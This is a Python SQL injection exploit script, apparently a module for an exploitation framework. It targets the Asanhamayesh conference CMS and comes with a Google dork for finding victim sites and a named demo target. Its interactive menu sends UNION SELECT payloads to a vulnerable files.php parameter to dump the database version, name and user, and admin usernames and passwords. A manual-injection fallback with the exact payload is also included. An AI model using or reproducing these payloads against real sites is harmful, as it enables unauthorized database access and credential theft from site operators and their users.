#!/usr/bin/python3
###########################################################################
#                          IN The Name OF God        
###########################################################################
# Title: Asanhamayesh CMS | SQL Injection
# Date: 2019-07-23                                     
# Google Dork: intext:طراح و پشتیبان : آسان همایش (نرم افزار مدیریت همایش و کنفرانس)                                     
# Exploit Author: Fri3nds Team
# Vendor Homepage: http://asanhamayesh.com     
# Tested on: GNU/Linux , Windows , FreeBsd , Android   
# CWE : CWE-89      
###########################################################################
# We Are : D3tect0r (AMJ) & Invisible rabbit(Mahdis) & K0uR0sH3R
###########################################################################
# Demo : http://www.med-sci.kau.ac.ir
###########################################################################
import requests , sys , readline
from bs4 import BeautifulSoup
import sys
sys.path.append("/opt/sandsploit/core/")
import Complator
host = None
name = "Asanhamayesh_CMS_Exploit"
author = "@Aμιρ-0x0 (AMJ)"
info = "a Tool for Grab Informations of websites...."
def help():
    print ("author              to show author name")
    print ("help                to show this massage")
    print ("info                To show description of the tool ")
    print ("set                 to set options such as : [set host http://google.com/]")
    print ("show_options        to show options of Tools")
    print ("exit                to quit from Tool")
def options():
    print ("options               value")
    print ("==========            ============")
    print ("host                  ",host)
    print(" \033[95mYou Must Enter URL with Protocol (Example : https://site.com or http://site.com)")
    print(" \033[95mYou Must Write / at The End of URL EX: www.site.com/")

def run():


    vuln = "/fa/files.php?id=-555"
    ufv = host+vuln
    pname = "asanhamayesh.com"

    z = requests.get(ufv)
    if pname in z.text:
        print ("Connected!")
        print ("Enter 'help' to Show Commands ")
        while True:
            opt = input ('\033[31m[root@asanhamayesh Exploit]# ')
            if opt == "help":
                
                print ('version     Show version of database')
                print ('database    Show Databasee name')
                print ('userdb      Show Database user') 
                print ('usernames   Show Usernames of CMS')
                print ('passwords   Show Passwords of CMS')
                print ('userpass    Show Usernames with Passwords [Ex:User:password]')
                print ('dontwork    If this Exploit failed to exploit the target, enter this command')
                print ('exit        Exit From Exploit')
                
            if opt == 'version':
                try:
                    payload = "+union+select+1,2,version(),4,5,6--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'class':'col-md-9'})
                    for i in data[1]:
                        print ('\033[92m' ,i)
                except:
                    payload = "+union+select+1,2,version(),4,5,6--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'style':''})
                    for i in data[1]:
                        print('\033[92m',i)
            elif opt == 'database':

                try:
                    payload = "+union+select+1,2,database(),4,5,6--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'class':'col-md-9'})
                    for i in data[1]:
                        print ('\033[92m',i)
                except:
                    payload = "+union+select+1,2,database(),4,5,6--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'style':''})
                    for i in data[1]:
                        print('\033[92m',i)
            elif opt == 'userdb':
                try:
                    payload = "+union+select+1,2,user(),4,5,6--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'class':'col-md-9'})
                    for i in data[1]:
                        print ('\033[92m',i)
                except:
                    payload = "+union+select+1,2,user(),4,5,6--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'style':''})
                    for i in data[1]:
                        print('\033[92m',i)
            elif opt == 'usernames':
                try:
                    payload = "+union+select+1,2,unhex(hex(group_concat(username))),4,5,6+from+sub_admins--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'class':'col-md-9'})
                    for i in data[1]:
                        print('\033[92m',i)
                except:
                    payload = "+union+select+1,2,unhex(hex(group_concat(username))),4,5,6+from+sub_admins--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'style':''})
                    for i in data[1]:
                        print('\033[92m',i)
            elif opt == 'passwords':
                try:
                    payload = "+union+select+1,2,unhex(hex(group_concat(password))),4,5,6+from+sub_admins--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'class':'col-md-9'})
                    for i in data[1]:
                        print (i)
                except:
                    payload = "+union+select+1,2,unhex(hex(group_concat(password))),4,5,6+from+sub_admins--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'style':''})
                    for i in data[1]:
                        print('\033[92m',i)
            elif opt == 'userpass':
                try:
                    payload = "+union+select+1,2,unhex(hex(group_concat(username,0x3a,password))),4,5,6+from+sub_admins--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'class':'col-md-9'})
                    for i in data[1]:
                        print('\033[92m',i)
                except:
                    payload = "+union+select+1,2,unhex(hex(group_concat(username,0x3a,password))),4,5,6+from+sub_admins--+"
                    up = (ufv+payload)
                    r = requests.get(up)
                    html = BeautifulSoup(r.content,'html.parser')
                    data = html.find_all('td',attrs={'style':''})
                    for i in data[1]:
                        print('\033[92m',i)
            elif opt == 'dontwork':
                print ('''\033[92m
                Well you can manually infiltrate your target
                To do this, place the bottom URL in front of the site address and manually inject the commands.
                /fa/files.php?id=-555
                In all sites the number of columns is equal to 6 and the vulnerable column is number 3.
                EX: site.com/fa/files.php?id=-555+union+select+1,2,unhex(hex(group_concat(username,0x3a,password))),4,5,6+from+sub_admins--+
                ''')
            elif opt == 'exit':
                sys.exit()
            else:
                print ("EXP:",opt,"Command Not Found")
    else:
        print ("Exploit is not Support From This Target")
        sys.exit()
while True:
    try:
        option = input ("\033[96m┌─[SSF][\033[91m"+name+"\033[96m]\n└─▪ ")
        op2 = option.split(" ")
        if option == "help":
            help()
        elif option == "author":
            print (author)
        elif option == "info":
            print (info)

        elif option == "show_options":
            options()
        elif op2[0] == "set":
            if op2[1] == "host":
                host = op2[2]
        elif option == "run":
            run()
        elif option == "exit":
            break
        else:
            print ("Wrong Command ! ")
    except:
        print ('Unknown Error')
